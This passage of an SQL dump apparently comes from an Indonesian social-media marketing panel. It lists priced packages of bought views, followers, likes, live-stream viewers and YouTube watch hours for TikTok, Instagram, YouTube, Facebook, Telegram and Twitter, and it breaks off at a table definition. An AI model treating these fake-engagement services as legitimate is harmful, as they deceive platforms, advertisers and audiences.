(433, 62, 'YouTube Live Stream Views [ max 200 ] [ 120 Minutes Live CONCURRENT ] ', 'Start in 5 Minutes\n1000 Live Orders will Get 900-1000 Live Stream Viewers', 100, 200, 305900, 152950, 1, 1, 8806),
(434, 62, 'YouTube Live Stream Views [ max 200 ] [ 3 Hours Live CONCURRENT ] ', 'Start in 5 Minutes\n1000 Live Orders will Get 900-1000 Live Stream Viewers', 100, 200, 463600, 231800, 1, 1, 8807),
(435, 62, 'YouTube Live Stream Views [ max 200 ] [ 6 Hours Live CONCURRENT ] ', 'Start in 10 Minutes\n1000 Live Orders will Get 900-1000 Live Stream Viewers', 100, 200, 923400, 461700, 1, 1, 8808),
(436, 62, 'YouTube Live Stream Views [ max 200 ] [ 12 Hours Live CONCURRENT ] ', 'Start in 5 Minutes\n1000 Live Order will Get 900-1000 Live Stream Viewer', 100, 200, 1235000, 617500, 1, 1, 8809),
(437, 62, 'YouTube Live Stream Views [ max 200 ] [ 24 Hours Live CONCURRENT ] ', '1000 Live Order will Get 900-1000 Live Stream Viewer\nStart in 5 Minutes', 100, 200, 1843000, 921500, 1, 1, 8810),
(438, 56, 'Facebook Group Member Server 5 [ 7 Days Refill ] 500-1K/hari ', '0-1hr\n1k/day\n7 Days Refill', 1000, 500000, 28500, 14250, 1, 1, 8811),
(439, 22, 'Facebook Follower Profile MP 18 [ Refill 30 Days ] ', 'Speed: 20K/Day\nStart Time: 0-2 Hours', 1000, 100000, 121600, 60800, 1, 1, 8812),
(440, 19, 'TIKTOK FOLLOWERS Server 21 [ non drop ] [ 30 days guarantee ] ', 'superfast', 10, 300000, 70300, 35150, 1, 1, 8813),
(441, 19, 'TIKTOK FOLLOWERS Server 22 [ 10k/day ] [ Lifetime guaranteed ]', 'Lifetime guaranteed\nwaktu mulai 0-12 jam', 20, 100000, 155800, 77900, 1, 1, 8814),
(442, 9, 'Youtube Views S14 [ Non Drop ] [ Life Time Guarantee ] 1K/Day ', 'Instant\n1k-2k/Day\n 0-1min retention\nfrom internal YouTube source + 3-4?ditional likes]\n 0-5% drops', 100, 500000, 43700, 21850, 1, 1, 8815),
(443, 37, 'Youtube Subscribe  No Refill 1  [ TERMURAH ]', 'min 10\nmax 20k', 10, 20000, 23180, 11590, 1, 1, 8816),
(444, 35, 'Instagram Custom Comments Indonesia Instan 3', 'Instan', 1, 2000, 1520000, 760000, 1, 1, 8817),
(445, 10, 'instagram view Server 1 [ Max - 10Juta ] TERMURAH', 'waktu mulai 0-60 Minutes', 100, 10000000, 57, 28.5, 1, 1, 8818),
(446, 20, 'TIKTOK Likes Server 21 [ 3k/day ] INSTAN', '[ 3k/day ] INSTAN', 100, 50000, 19000, 9500, 1, 1, 8819),
(447, 20, 'TIKTOK Likes Server 22 [ Refill 30 Days ] HQ', 'waktu mulai 6-12 jam', 100, 100000, 31920, 15960, 1, 1, 8820),
(448, 21, 'Youtube Like MP 20 [ 30 days refill ] [ 5k/day ]', 'Instan\n5k/days', 50, 500000, 20520, 10260, 1, 1, 8821),
(449, 33, 'Youtube Subscribe S12 [ 90 days refill ] [ 1000/day ] [ Non drop ] TERMURAH DIKELASNYA', '1000/day\n90 days refill', 50, 10000, 532000, 266000, 1, 1, 8822),
(450, 20, 'TIKTOK Likes Server 23 [ Refill 30 Days ] Slow', 'Start Time: 0 - 24 Hour', 100, 100000, 35720, 17860, 1, 1, 8823),
(451, 20, 'TIKTOK Likes Server 24 [ Refill 30 Days ] HQ REAL', '2K/Day', 10, 50000, 64600, 32300, 1, 1, 8824),
(452, 16, 'Instagram Likes S15 [ AUTO REFILL 30 DAYS ] [ FAST ] [ Start Time: 0 -1 Hours ] ', 'HQ', 10, 50000, 7600, 3800, 1, 1, 8825),
(453, 20, 'TIKTOK Likes Server 25 [ No Refill ] [Start Time 0 - 1 Hour]', 'TIKTOK Likes Server 25 [ No Refill ] [Start Time 0 - 1 Hour]', 100, 1000, 37240, 18620, 1, 1, 8826),
(454, 10, 'instagram view Server 2 [ Max - 10Juta ] Instant FAST ', 'Instant!', 100, 10000000, 83.6, 41.8, 1, 1, 8827),
(455, 63, 'Instagram Auto Likes Indonesia [MAX 1K] [DURASI 30 HARI] [MAX POST 30]  INSTANT', 'IMPRESSION + REACH + PROFILE VISIT\nTarget : Username akun Instagram\nPastikan Akun Instagram tidak private dan pembatasan usia\nCatatan : Setiap Anda upload postingan, maka Anda akan mendapatkan Likes Indonesia sesuai jumlah pesan selama 30 hari\nMaksimal 30 postingan per-bulan\nJika Auto Likes tidak bekerja dalam 24 jam maka bisa buat Tiket', 100, 1000, 760000, 380000, 1, 1, 8828),
(456, 63, 'Instagram Auto Likes Indonesia [MAX 1K] [DURASI 30 HARI] [MAX POST 150]  INSTANT', 'IMPRESSION + REACH + PROFILE VISIT\nTarget : Username akun Instagram\nPastikan Akun Instagram tidak private dan pembatasan usia\nCatatan : Setiap Anda upload postingan, maka Anda akan mendapatkan Likes Indonesia sesuai jumlah pesan selama 30 hari\nMaksimal 150 postingan per-bulan\nJika Auto Likes tidak bekerja dalam 24 jam maka bisa buat Tiket', 100, 1000, 4750000, 2375000, 1, 1, 8829),
(457, 20, 'TIKTOK Likes Server 27 [ No refill ] [ FAST ] BONUS++', 'tidak ada garansi\nbonus bisa 10-50% tergantung hoki/no kompline jika gk ada bonus dapat\n', 100, 10000, 36860, 18430, 1, 1, 8830),
(458, 20, 'TIKTOK Likes Server 28 [ No refill ] [ SUPERFAST EMERGENCY ]', 'EMERGENCY', 100, 15000, 28500, 14250, 1, 1, 8831),
(459, 19, 'TikTok Followers Server 23 [ 2k/day ] [ Refill 30 days ]', 'Speed: 3k-5k/Days\nRefill 30 days', 10, 500000, 77900, 38950, 1, 1, 8832),
(460, 19, 'TikTok Followers Server 24 [ 2k/day ] [ Refill 30 days ] ASIAN', 'Quality: 80% profile with pictures\n', 100, 500000, 228000, 114000, 1, 1, 8833),
(461, 9, 'Youtube Views S15 [ Good Service ] [ Refill 30days ]', '50k/day', 3000, 700000, 125400, 62700, 1, 1, 8834),
(462, 9, 'Youtube Views S16 [ Good Service ] [ Refill 30days ][Non Drop]', 'always work\n50k-100k/days', 10000, 1000000000, 83600, 41800, 1, 1, 8835),
(463, 48, 'Youtube views Refill 30 days [ Indonesia ] [Speed: 10k/Day] ', 'waktu mulai 0-12 jam', 1000, 1000000, 129200, 64600, 1, 1, 8836),
(464, 21, 'Youtube Like MP 21 [ INDONESIA ][ R30 ] Instant ', '20k/days\n', 10, 50000, 91200, 45600, 1, 1, 8837),
(465, 29, 'Instagram Followers Server 8 [ Refill 30D ] [ 10k/day ] ', 'drop bisa 20--50%\nwaktu mulai 0-3 jam', 10, 15000, 9500, 4750, 1, 1, 8838),
(466, 22, 'Facebook Follower Profile MP 19 [ Refill 30 Days ] [ start 0 - 6Hours ]', 'waktu mulai 0-6 jam', 1000, 100000, 72200, 36100, 1, 1, 8839),
(467, 20, 'TIKTOK Likes Server 29 [ No refill ] [ EMERGENCY KE 2 ] ', 'EMERGENCY', 100, 50000, 34580, 17290, 1, 1, 8840),
(468, 19, 'TikTok Followers Server 25 [ 1k/day ] [ Refill 30 days ] ', '1K/Day', 10, 50000, 129200, 64600, 1, 1, 8841),
(469, 19, 'TikTok Followers Server 26 [ 1k/day ] [ No refill ][ Max 700K ] ', 'Max 700K', 10, 750000, 49400, 24700, 1, 1, 8842),
(470, 13, 'Facebook Page Followers Server 2 [ No refill ] [ 500/Day ] ', '500/Day', 500, 500000, 57000, 28500, 1, 1, 8843),
(471, 13, 'Facebook Page Likes [ S 12 ] [ Refill 30days ] [ Start 1 Hour ] Real ', '10K/Day', 500, 50000, 402800, 201400, 1, 1, 8844),
(472, 20, 'TIKTOK Likes Server 31 [ 30 refill days] [ 10k/days ] ', '10K/Day', 100, 5000, 35796, 17898, 1, 1, 8845),
(473, 64, 'Tiktok SHARE PROMO 1 [ TERMURAH ] ', 'NOKOMPLINE', 100, 50000000, 456, 228, 1, 1, 8846),
(474, 9, 'Youtube Views S17 [ PRANK ] [ NO REFILL ]', 'BISA DROP KAPAN AJA\nKAMI TIDAK TERIMA KOMPLINE APAPUN!', 100, 5000, 13300, 6650, 1, 1, 8847),
(475, 3, 'Instagram - Story Views S4 All Story Views CHEAP', 'All Stories View', 10, 1000000, 220.4, 110.2, 1, 1, 8848),
(476, 3, 'Instagram Story Views S4 [ BEST ]  All Story Views', '10k/day', 100, 35000, 4750, 2375, 1, 1, 8849),
(477, 9, 'Youtube Views S18 [ HR ] [ 30 DAYS REFILL ]  Retention 2 - 5 Mins', '- Start Time : Instant\n- Speed : 50k/day\n- Retention : 2-5 minutes\n- Min/Max : 1000/10M\n- Guarantee: 30 days Refill\n- Source : External\n- Device : Mobile phone\n- Real user\n- Country : Global', 1000, 100000000, 119700, 59850, 1, 1, 8850),
(478, 33, 'Youtube Subscribe S13 [ 30 days refill ] [ 500-2k/days ] ', 'Start: Instant - 0 hrs\nSpeed: 500-2k/day\nRefill: 30 days\n\nDrop: 0- 5% drop.', 100, 120000, 304000, 152000, 1, 1, 8851),
(479, 33, 'Youtube Subscribe S14 [ 30 days refill ] [ 150-200/day ] MURAH', '150-200/day', 50, 15000, 276260, 138130, 1, 1, 8852),
(480, 20, 'TIKTOK Likes Server 32 [ 30 refill days] [ 3k/day ]', '3k/day', 100, 500000, 29260, 14630, 1, 1, 8853),
(481, 20, 'TIKTOK Likes Server 33 [ 30 refill days] [ 5k/days ] Best seller', '5k/days\nRefill 30 days', 100, 100000, 31920, 15960, 1, 1, 8854),
(482, 19, 'TikTok Followers Server 27 [ 10k-20k/day ] [ 30 days refill ][ Max 500K ] best seller', '10k-20k/day', 10, 500000, 159600, 79800, 1, 1, 8855),
(483, 9, 'Youtube Views S19 [ HR ] [ 30 DAYS REFILL ] [ 40k+/day ] Retention 3 - 7 Mins ', 'Retention 3-7 Minutes\n40k+/day', 1000, 2000000, 102600, 51300, 1, 1, 8856),
(484, 9, 'Youtube Views S20 [ 30 DAYS REFILL ] [ Speed 20k - 300k/day ]  [ Non Drop ]', 'Speed. : 500k-700k/day\nSource: external + suggested\nDrop: No Drop\nRefill : 30 days\nStart Time : 0-5hr', 10000, 1000000000, 100700, 50350, 1, 1, 8857),
(485, 20, 'TIKTOK Likes Server 35 [ No refill] [ 100-300/days ] REAL', 'REAL', 100, 1000000, 8930, 4465, 1, 1, 8858),
(486, 17, 'Instagram Followers Indonesia S28 [ NO Refill ] [ max db 5k ] Real ', 'Real', 100, 1000, 106400, 53200, 1, 1, 8859),
(487, 17, 'Instagram Followers Indonesia S29 [ Refill 3 days ] ', 'Bisa refill jika drop 50% lebih\nhanya bisa refill 1x', 100, 1000, 95000, 47500, 1, 1, 8860),
(488, 2, 'Telegram Channnel Members [ Max 50k ]  [ AR30 ]', 'Instant\nSpeed 10-20K day\nRefill 30 Day', 100, 100000, 45600, 22800, 1, 1, 8861),
(489, 25, 'TIKTOK View MP2 [ FAST ]', 'kemungkinan kalo stuck bisa lebih seminggu - 12 hari\nfast', 100, 1000000000, 171, 85.5, 1, 1, 8862),
(490, 25, 'TIKTOK View MP3 [ Trending + viral views]', '100% Real Engaging TikTok Views\nTiktok Trending Views\nHigh Chance to Get in Trend\nhttp://tiktok.com/trending\nPlace Big Order to Get in Trending.', 100, 10000000, 1748, 874, 1, 1, 8863);
INSERT INTO `services` (`id`, `category_id`, `service_name`, `note`, `min`, `max`, `price`, `profit`, `status`, `provider_id`, `provider_service_id`) VALUES
(491, 26, 'Youtube Live Stream Views [ NEW ] [ Viewers stay 3 jam ] ', 'Kualitas\nhttps://prnt.sc/vE5ukI0fa-5u\nhttps://prnt.sc/P2koX-ye_m_y\n\nkemungkinan besar view tidak masuk dalam itungan saat live selesai\nmulai 0-15 Menit Mulai (Dalam 15 menit jika tidak mulai, harap buat tiket dengan tangkapan layar)\n1000 = 100 Penonton selama 180 Menit/3jam, setelah itu mungkin turun.\nkamu order 1000 mendapatkan view 100\nkamu order 2000 mendapatkan view 200\nLive Streams are NON-REFUNDABLE and NO REFILL.\nEmbed Must Enable\nMobile links can delay', 1000, 2000, 125400, 62700, 1, 1, 8864),
(492, 25, 'TIKTOK View MP4 [ 500K/Day ] ', 'waktu mulai 0-1jam\n500K/Day\n', 100, 50000000, 1254, 627, 1, 1, 8865),
(493, 25, 'TIKTOK View MP5 [ stable ] ', 'Instant', 100, 10000000, 608, 304, 1, 1, 8866),
(494, 25, 'TIKTOK View MP6 [ INSTAN FAST ] ', 'Instant', 100, 100000000, 950, 475, 1, 1, 8867),
(495, 25, 'TIKTOK View MP7 [ CHEAP ]', 'BISA SLOW BISA FAST', 100, 1000000, 247, 123.5, 1, 1, 8868),
(496, 26, 'YouTube Live Stream [ 15 Minutes Live CONCURRENT ] [ Latest Service ] P1', 'YouTube Live Stream [ 15 Minutes Live CONCURRENT ] [ Latest Service ] P1', 100, 50000, 125400, 62700, 1, 1, 8869),
(497, 26, 'YouTube Live Stream [ 30 Minutes Live CONCURRENT ] [ Latest Service ] P1', 'YouTube Live Stream [ 30 Minutes Live CONCURRENT ] [ Latest Service ] P1', 100, 50000, 247000, 123500, 1, 1, 8870),
(498, 26, 'YouTube Live Stream [ 60 Minutes Live CONCURRENT ] [ Latest Service ] P1 ', 'YouTube Live Stream [ 60 Minutes Live CONCURRENT ] [ Latest Service ] P1', 100, 50000, 497800, 248900, 1, 1, 8871),
(499, 26, 'YouTube Live Stream [ 90 Minutes Live CONCURRENT ] [ Latest Service ] P1 ', 'YouTube Live Stream [ 90 Minutes Live CONCURRENT ] [ Latest Service ] P1', 100, 50000, 733400, 366700, 1, 1, 8872),
(500, 26, 'YouTube Live Stream [ 120 Minutes Live CONCURRENT ] [ Latest Service ] P1 ', 'YouTube Live Stream [ 120 Minutes Live CONCURRENT ] [ Latest Service ] P1', 100, 50000, 988000, 494000, 1, 1, 8873),
(501, 26, 'YouTube Live Stream [ 3 jam Live CONCURRENT ] [ Latest Service ] P1 ', 'YouTube Live Stream [ 3 jam Live CONCURRENT ] [ Latest Service ] P1', 100, 50000, 1482000, 741000, 1, 1, 8874),
(502, 26, 'YouTube Live Stream [ 6 jam Live CONCURRENT ] [ Latest Service ] P1 ', 'YouTube Live Stream [ 6 jam Live CONCURRENT ] [ Latest Service ] P1', 1000, 50000, 3610000, 1805000, 1, 1, 8875),
(503, 26, 'YouTube Live Stream [ 12 jam Live CONCURRENT ] [ Latest Service ] P1 ', 'YouTube Live Stream [ 12 jam Live CONCURRENT ] [ Latest Service ] P1', 100, 50000, 6460000, 3230000, 1, 1, 8876),
(504, 26, 'YouTube Live Stream [ 24 jam Live CONCURRENT ] [ Latest Service ] P1', 'YouTube Live Stream [ 24 jam Live CONCURRENT ] [ Latest Service ] P1', 100, 50000, 12844000, 6422000, 1, 1, 8877),
(505, 25, 'TIKTOK View MP4 [ TERMURAH YANG ADA!  ]', 'TERMURAH', 100, 50000, 83.6, 41.8, 1, 1, 8878),
(506, 56, 'Facebook Group Member Server 6 [ NO Refill ] 3K/hari', '3K/hari', 100, 5000000, 26220, 13110, 1, 1, 8879),
(507, 10, 'instagram view Server 5 [ Max - 10Juta ] ', 'waktu mulai 0-30menit', 100, 10000000, 83.6, 41.8, 1, 1, 8880),
(508, 10, 'instagram view Server 6 [ fast cheap ] ', 'fast', 100, 10000000, 60.8, 30.4, 1, 1, 8881),
(509, 21, 'Youtube Like MP 22 [ CHEAP ][ R30 ] ', 'waktu mulai 0-6 jam', 10, 50000, 14440, 7220, 1, 1, 8882),
(510, 31, 'Youtube Views S13 [ Jam Tayang ] [ Lifetime Refill ] [ BACA Deskripsi ] ', 'Waktu Mulai: 0- 4 hari\nsetiap pesanan dari layanan ini membutuhkan waktu 10-15 hari untuk diselesaikan jika Anda ingin meminta 4000 jam, minta mereka tepat waktu untuk menyelesaikannya dalam waktu singkat, bukan meminta 1000 lalu langsung 1000\n5 menit+ video dan minimal 10-20 video di saluran\nCATATAN: - Masukkan LINK CHANNEL YOUTUBE\nJangan hapus atau jadikan video pribadi setelah [Tanpa Pengembalian Dana]\nJika Anda Memesan 1000, Anda Akan Mendapatkan 1000 Jam.\nTidak ada Pembatalan mungkin ada penurunan karena pembaruan youtube dan kami hanya mengisi ulang untuk menjadi stabil, no PARTIAL, hanya mengisi ulang/refill.', 500, 8000, 193800, 96900, 1, 1, 8883),
(511, 31, 'Youtube Views S14 [ Jam Tayang ] [ Lifetime Refill ] [ BACA Deskripsi ] ', 'Waktu Mulai: 0- 4 hari\nsetiap pesanan dari layanan ini membutuhkan waktu 10-15 hari untuk diselesaikan jika Anda ingin meminta 4000 jam, minta tepat waktu untuk menyelesaikannya dalam waktu singkat, bukan meminta 1000 lalu  langsung 1000\nGaransi: Lifetime Refill\nContoh: pesan 1000 = 1000 jam.\nSaluran harus memiliki lebih dari 5 video dari masing-masing  harus durasi lebih 2 menit.', 500, 8000, 193800, 96900, 1, 1, 8884),
(512, 31, 'Youtube Views S15 [ Jam Tayang ] [ Refill 60 days  ] [ BACA Deskripsi ] ', 'Waktu Mulai: 0- 4 hari\nsetiap pesanan dari layanan ini membutuhkan waktu 10-15 hari untuk diselesaikan jika Anda ingin meminta 4000 jam, minta mereka tepat waktu untuk menyelesaikannya dalam waktu singkat, bukan meminta 1000 langsung 1000\nmin durasi vdeo 5 menit dan jumlah video diusahakan  10-20 di chanel \nORDER LINK CHANNEL YOUTUBE\nJangan hapus atau jadikan video pribadi setelah order [ NO REFUND ]\nJika Anda Memesan 1000, Anda Akan Mendapatkan 1000 Jam.\nTidak ada layanan Pembatalan mungkin ada penurunan karena pembaruan youtube dan kami hanya mengisi ulang untuk menjadi stabil, NO PARTIAL, hanya mengisi ulang/refill.', 500, 8000, 174800, 87400, 1, 1, 8885),
(513, 13, 'Facebook Page Likes [ S13 ] [ Refill 30days ] [ Start 24 Hour ] HQ', 'contoh target https://mobile.facebook.com/blogtakin\njangan https://www.facebook.com/blogtakin\nsupport link lama hanya diubah aja', 500, 100000, 188100, 94050, 1, 1, 8886),
(514, 13, 'Facebook Page Likes [ S14 ] [ Refill 7 days ] [ 3k/day ] ', 'waktu mulai 0-24 jam', 100, 100000, 152000, 76000, 1, 1, 8887),
(515, 13, 'Facebook Page Likes + Followers Server 3 [ refill 30 days ] [ 5k/Day ]  non drop', '5k/days\nwaktu mulai 0-6 jam\nnon drop', 100, 500000, 117800, 58900, 1, 1, 8888),
(516, 46, 'Facebook Video Views Server 5 [ Non Drop ] [Speed: 1M/Day]  [  Reels ]', 'Speed: 1M/Day\nno drop\ntapi jika terjadi drop, tidak ada garansi', 250, 10000000, 9500, 4750, 1, 1, 8889),
(517, 46, 'Facebook Video Views Server 6 [ Refill 30days ] [Speed: 5k-20k/days ]', 'Refill 30days', 500, 100000000, 9880, 4940, 1, 1, 8890),
(518, 65, 'Facebook Live Stream View [30 minutes]  [Non Drop]', '- Instan\n- Durasi: 30 menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 58520, 29260, 1, 1, 8891),
(519, 65, 'Facebook Live Stream View [60 minutes] [Non Drop]', '- Instan\n- Durasi: 60 menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 117040, 58520, 1, 1, 8892),
(520, 65, 'Facebook Live Stream View [90 minutes] [Non Drop] ', '- Instan\n- Durasi: 90 menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 174800, 87400, 1, 1, 8893),
(521, 65, 'Facebook Live Stream View [120 minutes] [Non Drop]', '- Instan\n- Durasi: 120menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 233700, 116850, 1, 1, 8894),
(522, 65, 'Facebook Live Stream View [150 minutes] [Non Drop]', '- Instan\n- Durasi: 150 menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 296400, 148200, 1, 1, 8895),
(523, 65, 'Facebook Live Stream View [180 minutes] [Non Drop]', '- Instan\n- Durasi: 180 menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 361000, 180500, 1, 1, 8896),
(524, 65, 'Facebook Live Stream View [210 minutes] [Non Drop] ', '- Instan\n- Durasi: 210 menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 418000, 209000, 1, 1, 8897),
(525, 65, 'Facebook Live Stream View [240 minutes] [Non Drop] ', '- Instan\n- Durasi: 240 menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 475000, 237500, 1, 1, 8898),
(526, 65, 'Facebook Live Stream View [270 minutes] [Non Drop] ', '- Instan\n- Durasi: 270 menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 539600, 269800, 1, 1, 8899),
(527, 65, 'Facebook Live Stream View [300  minutes] [Non Drop] ', '- Instan\n- Durasi: 300 menit\n- Tampilan stabil dan kualitas (garansi).\n- Dukungan untuk tampilan terus meningkat dalam 5 menit pertama setelah melakukan pemesanan.\n- Jumlah view akan lengkap mulai dari menit ke-6 setelah pesanan dilakukan.\n- Kami mendukung pengembalian dana sebagian/partial atau reffund jika view hilang atau masalah tak terduga', 50, 10000, 608000, 304000, 1, 1, 8900),
(528, 25, 'TIKTOK View MP8 [ MURAH] ', 'Max 10M', 100, 15000000, 159.6, 79.8, 1, 1, 8901),
(529, 19, 'TikTok Followers Server 28 [ 5k-10k/day ] [ 30 days refill ][ Max 200K ]', 'waktu mulai 0-6 jam', 100, 200000, 51680, 25840, 1, 1, 8902),
(530, 20, 'TIKTOK Likes Server 36 [ No refill ] [ 1k/days ] ULTRAFAST', 'ULTRAFAST', 100, 1000, 27360, 13680, 1, 1, 8903),
(531, 38, 'Instagram Followers Server 33 [ Refill 365D ] [ Max 5M ] [ 10-20k per day ] ', '10-20k per day', 10, 5000000, 21280, 10640, 1, 1, 8904),
(532, 38, 'Instagram Followers Server 34 [ Refill 365D ] [ Max 100K ] [ 50-80k per day ] AUTO REFILL SPECIAL', '50-80k per day', 500, 100000, 25840, 12920, 1, 1, 8905),
(533, 17, 'Instagram Followers Indonesia S28 [ Refill 5 days ] ', 'bisa refill hanya sekali\nhanya bisa di refill jika drop 45% saat 5 hari setelah order\nhari ke 6 gk bisa refill', 100, 4000, 133000, 66500, 1, 1, 8906),
(534, 2, 'Telegram Channnel Members/Group Server 15 [ 30K ] [ Refill 30 days ]', 'Instant\nSpeed: 20K day\nRefill: 30 day', 500, 30000, 54340, 27170, 1, 1, 8907),
(535, 2, 'Telegram Channnel Members/Group Server 16 [ 10K ] [ Refill 14 days ] ', 'Instant\nSpeed: 10K day\nRefill 14 day', 100, 10000, 52060, 26030, 1, 1, 8908),
(536, 19, 'TikTok Followers Server 29 [ 5k-10k/day ] [ 30 days refill ][ HQ ] ', 'instan\n10k/days', 10, 500000, 53200, 26600, 1, 1, 8909),
(537, 34, 'Instagram Followers Refill S78 [ LESS DROP ] [ R99 ]', '99 days refill\n0-3% drop\n20-25k per day', 10, 1000000, 15960, 7980, 1, 1, 8910),
(538, 66, 'Twitter Tweet Views Server 1 [ Max 500K ] FAST', 'Max 500K\nwaktu mulai 0-30 menit', 50, 500000, 456, 228, 1, 1, 8911),
(539, 66, 'Twitter Tweet Views Server 2 [ Max 1M ] FAST', 'Max 1M \nwaktu mulai 0-30 menit', 100, 1000000, 494, 247, 1, 1, 8912),
(540, 66, 'Twitter Tweet Views Server 3 [ Max 20M ] FAST', 'FAST\nwaktu mulai 0-60 menit', 10, 20000000, 627, 313.5, 1, 1, 8913),
(541, 6, 'Twitter Views Video Server 5 [ FAST - Max 10M ]', 'waktu mulai 0-15 menit\nNo refill', 20, 10000000, 125.4, 62.7, 1, 1, 8914),
(542, 25, 'TIKTOK View MP9 [ TERMURAH]', 'waktu mulai 0-30 menit', 100, 5000000, 136.8, 68.4, 1, 1, 8915),
(543, 67, 'TikTok Livestream Views [Max: 10K] [Start Time: INSTANT] [Stay: 15 menit]', 'Instan\nStay 15 mnt.\nView akan tetap selama periode waktu pemesanan\n100?ri volume pesanan dan penonton hadir\nKualitas: dengan avatar penonton\nJika waktu habis, itu akan berakhir. Jika waktunya belum habis, pemutusan bisa terus bertambah.', 100, 100000, 155800, 77900, 1, 1, 8916),
(544, 67, 'TikTok Livestream Views [Max: 10K] [Start Time: INSTANT] [Stay: 30menit] ', 'Instan\nStay 30 mnt.\nView akan tetap selama periode waktu pemesanan\n100% volume pesanan dan penonton hadir\nKualitas: dengan avatar penonton\nJika waktu habis, itu akan berakhir. Jika waktunya belum habis, pemutusan bisa terus bertambah.', 100, 10000, 258400, 129200, 1, 1, 8917),
(545, 67, 'TikTok Livestream Views [Max: 10K] [Start Time: INSTANT] [Stay: 1 jam]', 'Instan\nStay 1 jam.\nView akan tetap selama periode waktu pemesanan\n100% volume pesanan dan penonton hadir\nKualitas: dengan avatar penonton\nJika waktu habis, itu akan berakhir. Jika waktunya belum habis, pemutusan bisa terus bertambah.', 100, 100000, 414200, 207100, 1, 1, 8918),
(546, 67, 'TikTok Livestream Views [Max: 10K] [Start Time: INSTANT] [Stay: 3 jam]', 'Instan\nStay  3 jam.\nView akan tetap selama periode waktu pemesanan\n100% volume pesanan dan penonton hadir\nKualitas: dengan avatar penonton\nJika waktu habis, itu akan berakhir. Jika waktunya belum habis, pemutusan bisa terus bertambah.', 100, 100000, 1124800, 562400, 1, 1, 8919),
(547, 67, 'TikTok Livestream Views [Max: 10K] [Start Time: INSTANT] [Stay: 6 jam]', 'Instan\nStay 6 jam.\nView akan tetap selama periode waktu pemesanan\n100% volume pesanan dan penonton hadir\nKualitas: dengan avatar penonton\nJika waktu habis, itu akan berakhir. Jika waktunya belum habis, pemutusan bisa terus bertambah.', 100, 100000, 2033000, 1016500, 1, 1, 8920),
(548, 67, 'TikTok Livestream Views [Max: 10K] [Start Time: INSTANT] [Stay: 24 jam]', 'Instan\nStay 24 jam.\nView akan tetap selama periode waktu pemesanan\n100% volume pesanan dan penonton hadir\nKualitas: dengan avatar penonton\nJika waktu habis, itu akan berakhir. Jika waktunya belum habis, pemutusan bisa terus bertambah.', 100, 50000, 5130000, 2565000, 1, 1, 8921),
(549, 31, 'Youtube Views S16 [ Jam Tayang ] [ Refill 30 days ] [ BACA Deskripsi ] 50-200hrs/days', 'Tautan: Link video\nMulai : 0-12H\nKecepatan: 50-200 jam per hari\nIsi ulang: 30 hari\n\n DUrasi video 60 menit atau lebih (Lebih lama, waktu penyelesaian akan lebih cepat)\n Waktu penyelesaian: 50-200 jam hari (video berdurasi 60+ Menit)\n Tautan: Link video\nCatatan: Penyematan Harus diaktifkan\nCatatan: Video Premier, Video streaming langsung Tidak diterima/Tidak diizinkan\n\nPanjang video minimal 1 jam diperlukan.\nTidak ada isi ulang/pengembalian uang jika video kurang dari 1 jam dan pengiriman sudah dilakukan.\n\nWaktu menonton akan memakan waktu 3 hari untuk memperbarui analitik. Tolong jangan komplain sebelum 3 hari. Hanya mengeluh setelah 3 hari dengan tangkapan layar analitik video Anda.\n\nCatatan: Kami tidak menawarkan jaminan apa pun bahwa waktu tonton kami memenuhi syarat untuk monetisasi itu semua dari pihak youtube nya', 100, 4000, 710600, 355300, 1, 1, 8922),
(550, 18, 'Instagram Likes Indonesia MP 13 FAST REAL ACCOUNT [ REFILL 7 DAYS ] max 1k✨', 'REFILL 7 DAYS\ndiitung garansi nya saat pesanan sukses', 100, 1000, 45600, 22800, 1, 1, 8923);

-- --------------------------------------------------------

--
-- Struktur dari tabel `service_cat`
--

CREATE TABLE `service_cat` (
  `id` int(10) NOT NULL,
